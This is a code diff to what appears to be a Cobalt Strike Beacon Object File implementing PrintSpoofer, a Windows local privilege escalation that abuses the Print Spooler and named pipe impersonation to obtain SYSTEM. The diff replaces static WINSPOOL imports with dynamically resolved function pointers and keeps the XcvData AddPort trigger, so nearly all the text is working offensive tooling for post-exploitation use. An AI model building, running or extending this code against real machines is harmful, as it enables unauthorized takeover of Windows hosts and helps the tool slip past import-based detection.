@@ -5,6 +5,38 @@
 // Global variable for token mode
 DWORD token_mode __attribute__((section (".data"))) = 0;
 
+// Function pointers for WINSPOOL functions (dynamically loaded)
+typedef BOOL (WINAPI *OpenPrinterW_t)(LPWSTR, LPHANDLE, LPPRINTER_DEFAULTSW);
+typedef BOOL (WINAPI *ClosePrinter_t)(HANDLE);
+typedef DWORD (WINAPI *XcvDataW_t)(HANDLE, PCWSTR, PBYTE, DWORD, PBYTE, DWORD, PDWORD, PDWORD);
+
+OpenPrinterW_t pOpenPrinterW = NULL;
+ClosePrinter_t pClosePrinter = NULL;
+XcvDataW_t pXcvDataW = NULL;
+
+// Load WINSPOOL functions dynamically
+BOOL LoadWinspoolFunctions()
+{
+    HMODULE hWinspool = KERNEL32$LoadLibraryA("winspool.drv");
+    if (!hWinspool)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load winspool.drv. Error: %d\n", KERNEL32$GetLastError());
+        return FALSE;
+    }
+    
+    pOpenPrinterW = (OpenPrinterW_t)KERNEL32$GetProcAddress(hWinspool, "OpenPrinterW");
+    pXcvDataW = (XcvDataW_t)KERNEL32$GetProcAddress(hWinspool, "XcvDataW");
+    pClosePrinter = (ClosePrinter_t)KERNEL32$GetProcAddress(hWinspool, "ClosePrinter");
+    
+    if (!pOpenPrinterW || !pXcvDataW || !pClosePrinter)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get WINSPOOL function addresses\n");
+        return FALSE;
+    }
+    
+    return TRUE;
+}
+
 BOOL IsTokenSystem(HANDLE hToken)
 {
     DWORD dwLength = 0;
@@ -110,13 +142,13 @@ BOOL TriggerNamedPipeConnection(LPCSTR lpName)
     PRINTER_DEFAULTS pd = { 0 };
     pd.DesiredAccess = SERVER_ACCESS_ADMINISTER;
     
-    if (WINSPOOL$OpenPrinterW(L",XcvMonitor Local Port", &hPrinter, &pd))
+    if (pOpenPrinterW(L",XcvMonitor Local Port", &hPrinter, &pd))
     {
         DWORD dwNeeded, dwStatus;
         BYTE output[4096];
         
         // Add port using XcvData
-        DWORD result = WINSPOOL$XcvDataW(
+        DWORD result = pXcvDataW(
             hPrinter,
             L"AddPort",
             (PBYTE)lpPortName,
@@ -127,7 +159,7 @@ BOOL TriggerNamedPipeConnection(LPCSTR lpName)
             &dwStatus
         );
         
-        WINSPOOL$ClosePrinter(hPrinter);
+        pClosePrinter(hPrinter);
         
         if (result == ERROR_SUCCESS || dwStatus == ERROR_SUCCESS)
         {
@@ -222,6 +254,12 @@ void go(char* args, int len)
     
     BeaconPrintf(CALLBACK_OUTPUT, "[*] PrintSpoofer - Local Privilege Escalation\n");
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique: Named Pipe Impersonation via Print Spooler\n\n");
+    
+    // Load WINSPOOL functions dynamically
+    if (!LoadWinspoolFunctions())
+    {
+        return;
+    }
     
     // Generate random pipe name
     CHAR pipeName[MAX_PATH];
